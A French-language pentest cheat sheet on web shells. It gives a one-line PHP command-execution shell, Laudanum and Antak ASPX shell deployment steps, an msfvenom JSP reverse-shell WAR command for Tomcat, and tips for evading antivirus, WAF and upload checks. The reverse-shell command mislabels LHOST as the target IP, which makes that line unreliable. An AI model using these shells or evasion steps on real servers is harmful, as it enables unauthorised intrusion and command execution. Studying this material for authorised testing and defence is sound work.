# Web shells

## Pourquoi

Les applications web constituent la majorite de la surface d'attaque exposee lors des engagements externes. Quand une fonctionnalite d'upload est exploitable ou qu'une injection permet de deposer un fichier, le web shell est souvent la premiere etape : un fichier PHP, ASPX ou JSP qui permet d'executer des commandes depuis un navigateur.

Un web shell n'est generalement qu'une etape intermediaire. L'objectif est souvent de pivoter vers un reverse shell plus stable et interactif.

## Comment ca marche

Un web shell est un fichier de script serveur (PHP, ASP.NET, JSP) depose sur le serveur web. Quand le navigateur accede a ce fichier, le serveur l'interprete et execute le code qu'il contient. Ce code prend generalement une commande en parametre (via GET ou POST), l'execute sur le systeme, et renvoie le resultat dans la page HTML.

### Vecteurs de deploiement courants

- Upload non restreint (formulaire de telechargement, photo de profil)
- Injection SQL menant a une ecriture de fichier
- LFI/RFI (inclusion de fichier local ou distant)
- Deploiement de fichier WAR sur Tomcat
- FTP mal configure donnant acces au webroot

## En pratique

### PHP Web Shell

Le web shell PHP le plus simple tient en une ligne :

```php
<?php system($_GET['cmd']); ?>
```

Acces : `http://<IP_CIBLE>/shell.php?cmd=id`

Des web shells plus complets (interface graphique, gestion de fichiers) existent, comme celui de WhiteWinterWolf.

{% hint style="warning" %}
Les applications web verifient souvent le type MIME et l'extension du fichier uploade. Burp Suite permet d'intercepter la requete et de modifier le Content-Type (par exemple `application/x-php` vers `image/gif`) pour contourner ces verifications cote client.
{% endhint %}

### Laudanum (ASPX)

Laudanum est une collection de web shells pretes a l'emploi pour plusieurs langages (PHP, ASPX, JSP). Sur Exegol/Kali, les fichiers sont disponibles dans :

```bash
/usr/share/laudanum/
```

**Deploiement d'un shell ASPX :**

1. Copier et modifier le fichier :

```bash
cp /usr/share/laudanum/aspx/shell.aspx /tmp/shell.aspx
```

2. Modifier la variable `allowedIps` (ligne ~59) pour y ajouter l'IP de l'attaquant.

3. Uploader le fichier via la fonctionnalite d'import de l'application cible.

4. Naviguer vers l'URL du fichier pour acceder au shell.

{% hint style="info" %}
Supprimer les commentaires et l'ASCII art du fichier Laudanum avant l'upload. Ces elements sont utilises comme signatures par certains antivirus.
{% endhint %}

### Antak (ASPX - Nishang)

Antak est un web shell ASP.NET du projet Nishang. Il fournit une console PowerShell dans le navigateur avec upload/download de fichiers, execution de scripts en memoire et requetes SQL.

```bash
/usr/share/nishang/Antak-WebShell/antak.aspx
```

Avant l'upload :
- Configurer un nom d'utilisateur et un mot de passe dans le fichier (ligne 14)
- Supprimer l'ASCII art

### Deploiement WAR sur Tomcat

Si Tomcat Manager est accessible, il est possible de deployer un fichier WAR contenant un reverse shell JSP :

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP_CIBLE> LPORT=4444 -f war -o shell.war
```

Uploader le .war via l'interface Manager, puis naviguer vers `http://<IP_CIBLE>:8080/shell/` pour declencher le reverse shell.

## Pieges et galeres

- Un web shell n'est pas un shell interactif. Les commandes longues, le chaining complexe et les programmes interactifs ne fonctionnent pas bien.
- Certains serveurs purgent les fichiers uploades automatiquement. Le web shell peut disparaitre apres quelques minutes.
- Un fichier depose et non supprime est une preuve evidente de compromission. En mission, toujours nettoyer apres soi.
- Les WAF (Web Application Firewalls) detectent les patterns de web shells connus. Il peut etre necessaire d'obfusquer le code.

## Retour terrain

En engagement externe, les web shells sont souvent le premier acces obtenu. L'etape critique est de pivoter rapidement vers un reverse shell stable (via un one-liner Python, Bash ou PowerShell execute depuis le web shell) pour ne pas dependre d'un fichier qui peut etre supprime a tout moment. Documenter le hash SHA256 de tout fichier depose, et le chemin d'acces, pour le rapport.

## Memo express

| Type | Emplacement par defaut | Usage |
|---|---|---|
| PHP (simple) | A creer | `<?php system($_GET['cmd']); ?>` |
| Laudanum (ASPX) | `/usr/share/laudanum/aspx/shell.aspx` | Web shell ASPX avec restriction IP |
| Antak (ASPX) | `/usr/share/nishang/Antak-WebShell/antak.aspx` | Console PowerShell dans le navigateur |
| WAR (JSP) | Genere avec MSFvenom | Deploiement sur Tomcat Manager |

***
